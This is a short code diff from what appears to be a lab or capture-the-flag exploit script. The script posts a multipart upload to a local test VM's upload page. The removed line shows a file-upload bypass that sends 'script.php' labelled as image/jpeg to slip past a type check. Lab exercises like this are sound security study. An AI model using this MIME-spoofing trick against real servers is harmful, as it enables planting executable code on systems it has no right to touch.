@@ -24,7 +24,6 @@ async function main() {
                 "Referer": "http://192.168.56.101/?page=upload",
                 "Referrer-Policy": "strict-origin-when-cross-origin"
             },
-            // "body": "------WebKitFormBoundaryr9KaG8P230OzUHGs\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n------WebKitFormBoundaryr9KaG8P230OzUHGs\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"script.php\"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundaryr9KaG8P230OzUHGs\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n------WebKitFormBoundaryr9KaG8P230OzUHGs--\r\n",
             "body": form,
             "method": "POST"
         });
